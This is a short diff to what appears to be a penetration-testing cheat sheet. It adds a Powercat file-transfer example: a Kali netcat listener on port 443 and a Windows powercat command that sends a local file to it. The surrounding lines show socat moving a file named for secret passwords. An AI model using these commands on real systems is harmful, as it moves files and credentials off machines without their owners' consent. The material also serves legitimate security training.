@@ -34,3 +34,9 @@ bye
 [Windows] socat TCP:<listener_address>:443 file:received_secret_passwords.txt,create
 ```
 
+```bash
+# Use Powercat to transfer files
+[Kali] nc -lnvp 443 > receiving_file.txt
+[Windows] powercat -c <listener ip address> -p 443 -i \<path-to-file>\sending_file.txt
+
+
